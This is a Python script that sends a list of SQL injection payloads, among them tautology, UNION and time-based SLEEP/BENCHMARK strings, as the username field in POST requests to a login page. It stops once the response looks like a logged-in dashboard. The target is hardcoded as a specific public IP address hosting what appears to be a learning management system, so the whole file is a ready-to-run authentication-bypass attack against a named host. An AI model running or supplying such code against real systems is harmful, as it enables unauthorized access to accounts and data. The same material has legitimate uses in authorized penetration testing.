import requests

# Target URL
url = "http://118.107.134.251/uobs-lms/login"  # Replace with your site's login endpoint

# List of SQL injection payloads to test
payloads = [
    "' OR '1'='1' --",               # Basic bypass
    "' OR 1=1 --",                   # Numeric bypass
    "' OR '1'='1' #",                # MySQL comment style
    "' OR 1=1 LIMIT 1 --",           # With LIMIT
    "' UNION SELECT NULL,NULL --",   # Union-based injection
    "' OR EXISTS(SELECT 1) --",      # Logical injection
    "' AND 1=1 --",                  # Basic AND condition
    "' AND 1=2 --",                  # False condition for testing
    "' OR SLEEP(5) --",              # Time-based injection
    "' OR BENCHMARK(1000000,MD5(1)) --",  # Benchmark testing
]

# Headers to simulate a browser request
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

# Success indicators (update these based on your site's response behavior)
success_indicators = ["Welcome", "Dashboard", "Logged in"]

# Test each payload
for payload in payloads:
    print(f"[*] Testing payload: {payload}")
    
    # POST data with SQL injection payload
    data = {
        "username": payload,
        "password": "anyvalue"  # Password can be anything
    }

    try:
        # Send the POST request
        response = requests.post(url, data=data, headers=headers, timeout=10)

        # Log response details
        print(f"Status Code: {response.status_code}")
        print(f"Response Length: {len(response.text)}")
        
        # Check for success indicators
        if any(indicator in response.text for indicator in success_indicators):
            print("[+] SQL Injection successful!")
            print(f"[+] Payload: {payload}")
            break
        else:
            print("[-] Payload failed.")

    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}")

print("[*] Testing completed.")
